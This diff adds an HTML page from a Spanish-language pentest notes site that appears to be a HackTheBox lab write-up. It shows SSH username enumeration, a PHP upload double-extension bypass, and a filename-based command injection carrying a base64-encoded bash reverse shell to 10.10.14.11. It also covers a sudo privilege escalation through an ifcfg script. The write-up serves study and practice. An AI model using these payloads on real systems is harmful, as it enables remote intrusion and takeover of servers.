@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH &amp;lt; 7.7&lt;/code&gt;&lt;/p&gt;&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python CVE-2018-15473.py 10.10.10.146 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root 2&amp;gt;/dev/null&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] root is a valid username❯ python CVE-2018-15473.py 10.10.10.146 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; root2 2&amp;gt;/dev/null&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] root2 is an invalid username&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p><code class="language-plaintext highlighter-rouge">SSH &lt; 7.7</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python CVE-2018-15473.py 10.10.10.146 <span class="nt">-u</span> root 2&gt;/dev/null
+<span class="o">[</span>+] root is a valid username
+❯ python CVE-2018-15473.py 10.10.10.146 <span class="nt">-u</span> root2 2&gt;/dev/null
+<span class="o">[</span>-] root2 is an invalid username
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">upload.php</code></p>
+<pre><code class="language-PHP">&lt;?php
+require '/var/www/html/lib.php';
+
+define("UPLOAD_DIR", "/var/www/html/uploads/");
+
+if( isset($_POST['submit']) ) {
+  if (!empty($_FILES["myFile"])) {
+    $myFile = $_FILES["myFile"];
+
+    if (!(check_file_type($_FILES["myFile"]) &amp;&amp; filesize($_FILES['myFile']['tmp_name']) &lt; 60000)) {
+      echo '&lt;pre&gt;Invalid image file.&lt;/pre&gt;';
+      displayform();
+    }
+
+    if ($myFile["error"] !== UPLOAD_ERR_OK) {
+        echo "&lt;p&gt;An error occurred.&lt;/p&gt;";
+        displayform();
+        exit;
+    }
+
+    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
+    list ($foo,$ext) = getnameUpload($myFile["name"]); #AQUÍ ESTÁ LA MIGA
+    $validext = array('.jpg', '.png', '.gif', '.jpeg');
+    $valid = false;
+    foreach ($validext as $vext) {
+      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) { #Retorna 0 si son iguales
+        $valid = true;
+      }
+    }
+	#shell.php.jpg pasa la validación
+	
+
+    if (!($valid)) {
+      echo "&lt;p&gt;Invalid image file&lt;/p&gt;";
+      displayform();
+      exit;
+    }
+    #shell.php.jpg pasa la validación
+    
+    $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext; #10_10_14_11.php.gif
+
+    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
+    if (!$success) {
+        echo "&lt;p&gt;Unable to save file.&lt;/p&gt;";
+        exit;
+    }
+    echo "&lt;p&gt;file uploaded, refresh gallery&lt;/p&gt;";
+
+    // set proper permissions on the new file
+    chmod(UPLOAD_DIR . $name, 0644);
+  }
+} else {
+  displayform();
+}
+?&gt;
+</code></pre>
+
+<p><code class="language-plaintext highlighter-rouge">lib.php</code></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="n">getnameCheck</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span>
+  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span>
+  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="c1">#echo "name $name - ext $ext\n";</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">getnameUpload</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span> <span class="c1">#AQUÍ ESTÁ LA MIGA</span>
+  <span class="nv">$pieces</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$filename</span><span class="p">);</span> <span class="c1"># shell php jpg</span>
+  <span class="nv">$name</span><span class="o">=</span> <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$pieces</span><span class="p">);</span>
+  <span class="c1">#Array  </span>
+<span class="c1">#(  </span>
+<span class="c1">#    [0] =&gt; shell  </span>
+<span class="c1">#    [1] =&gt; php    </span>
+<span class="c1">#    [2] =&gt; jpg  </span>
+<span class="c1">#)</span>
+  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'_'</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$name</span><span class="p">);</span> <span class="c1"># $name="shell"</span>
+  <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'.'</span><span class="p">,</span><span class="nv">$pieces</span><span class="p">);</span> <span class="c1"># php.jpg</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">check_ip</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">//echo "prefix: $prefix - fname: $filename&lt;br&gt;\n";</span>
+  <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$prefix</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_IP</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="nv">$ret</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">"4tt4ck on file "</span><span class="mf">.</span><span class="nv">$filename</span><span class="mf">.</span><span class="s2">": prefix is not a valid ip "</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$msg</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="nv">$ret</span><span class="p">,</span><span class="nv">$msg</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'finfo_file'</span><span class="p">))</span> <span class="p">{</span> <span class="c1">#Si la función existe, se usará</span>
+    <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="no">FILEINFO_MIME</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">))</span> <span class="c1">// It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system</span>
+    <span class="p">{</span>
+      <span class="nv">$mime</span> <span class="o">=</span> <span class="o">@</span><span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span> <span class="c1">#Sacat el Mime</span>
+      <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$mime</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="nv">$regexp</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$file_type</span> <span class="o">=</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'mime_content_type'</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="nv">$file_type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">'tmp_name'</span><span class="p">]);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$file_type</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// It's possible that mime_content_type() returns FALSE or an empty string</span>
+    <span class="p">{</span>
+      <span class="k">return</span> <span class="nv">$file_type</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">'type'</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">check_file_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$mime_type</span> <span class="o">=</span> <span class="nf">file_mime_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mime_type</span><span class="p">,</span> <span class="s1">'image/'</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+  <span class="p">}</span>  
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">displayform</span><span class="p">()</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="s">"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"myFile"</span><span class="nt">&gt;</span>
+ <span class="nt">&lt;br&gt;</span>
+<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"go!"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="cp">&lt;?php</span>
+  <span class="k">exit</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Subir un archivo <code class="language-plaintext highlighter-rouge">shell.php.png</code> se interpreterá como <code class="language-plaintext highlighter-rouge">.php</code> por cierta configuración del servidor:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/httpd/conf.d/php.conf
+
+AddHandler php5-script .php
+AddType text/html .php
+DirectoryIndex index.php
+php_value session.save_handler <span class="s2">"files"</span>
+php_value session.save_path    <span class="s2">"/var/lib/php/session"</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*/3 * * * * php /home/guly/check_attack.php
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="s1">'/var/www/html/lib.php'</span><span class="p">;</span>
+<span class="nv">$path</span> <span class="o">=</span> <span class="s1">'/var/www/html/uploads/'</span><span class="p">;</span>
+<span class="nv">$logpath</span> <span class="o">=</span> <span class="s1">'/tmp/attack.log'</span><span class="p">;</span>
+<span class="nv">$to</span> <span class="o">=</span> <span class="s1">'guly'</span><span class="p">;</span>
+<span class="nv">$msg</span><span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="s2">"X-Mailer: check_attack.php</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+<span class="nv">$files</span> <span class="o">=</span> <span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/^([^.])/'</span><span class="p">,</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">));</span> <span class="c1">#Devuelve los ficheros subidos cuyo nombre cumplen la regex (que no empiecen por un punto)</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$msg</span><span class="o">=</span><span class="s1">''</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="s1">'index.html'</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">continue</span><span class="p">;</span> <span class="c1">#Itera sobre cada uno de los ficheros subidos menos index.html</span>
+  <span class="p">}</span>
+  <span class="c1">#echo "-------------\n";</span>
+
+  <span class="c1">#print "check: $value\n";</span>
+  <span class="k">list</span> <span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$ext</span><span class="p">)</span> <span class="o">=</span> <span class="nf">getnameCheck</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> <span class="c1"># $name="shell" $ext="php.jpg"</span>
+  <span class="nv">$check</span> <span class="o">=</span> <span class="nf">check_ip</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span> <span class="c1">#$value="shell.php.jpg"</span>
+
+<span class="c1">#4tt4ck on file ".$filename.": prefix is not a valid ip </span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$check</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"attack!</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="c1"># todo: attach file</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$logpath</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="no">FILE_APPEND</span> <span class="o">|</span> <span class="no">LOCK_EX</span><span class="p">);</span>
+
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"rm -f </span><span class="nv">$logpath</span><span class="s2">"</span><span class="p">);</span> <span class="c1">#no es controlable</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="s2">"nohup /bin/rm -f </span><span class="nv">$path$value</span><span class="s2"> &gt; /dev/null 2&gt;&amp;1 &amp;"</span><span class="p">);</span> <span class="c1"># $value es el nombre del archivo, podemos controlarlo</span>
+    <span class="k">echo</span> <span class="s2">"rm -f </span><span class="nv">$path$value</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="c1"># $value="test;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.11/5555 0&gt;&amp;1;"</span>
+    <span class="c1"># exec("nohup /bin/rm -f $pathtest;/bin/bash /tmp/shell.sh; &gt; /dev/null 2&gt;&amp;1 &amp;");</span>
+    <span class="nb">mail</span><span class="p">(</span><span class="nv">$to</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$msg</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">,</span> <span class="s2">"-F</span><span class="nv">$value</span><span class="s2">"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.11/5555 0&gt;&amp;1'</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0 <span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">touch</span> <span class="nt">--</span> <span class="s1">';echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExLzU1NTUgMD4mMQ== | base64 -d | bash'</span>
+</code></pre></div></div>
+
+<p><strong>El script se utiliza con bash -p , por lo que está protegido contra path hijacking</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash -p</span>
+<span class="nb">cat</span> <span class="o">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class="o">&lt;&lt;</span> <span class="no">EoF</span><span class="sh">
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+</span><span class="no">EoF
+
+</span><span class="nv">regexp</span><span class="o">=</span><span class="s2">"^[a-zA-Z0-9_</span><span class="se">\ </span><span class="s2">/-]+$"</span>
+
+<span class="k">for </span>var <span class="k">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class="p">;</span> <span class="k">do
+	</span><span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+	<span class="nb">read </span>x
+	<span class="k">while</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$x</span> <span class="o">=</span>~ <span class="nv">$regexp</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do
+		</span><span class="nb">echo</span> <span class="s2">"wrong input, try again"</span>
+		<span class="nb">echo</span> <span class="s2">"interface </span><span class="nv">$var</span><span class="s2">:"</span>
+		<span class="nb">read </span>x
+	<span class="k">done
+	</span><span class="nb">echo</span> <span class="nv">$var</span><span class="o">=</span><span class="nv">$x</span> <span class="o">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly
+<span class="k">done</span>
+  
+/sbin/ifup guly0
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/local/sbin/changename.sh 
+interface NAME:
+abc /bin/bash
+interface PROXY_METHOD:
+abc
+interface BROWSER_ONLY:
+abc
+interface BOOTPROTO:
+abc
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
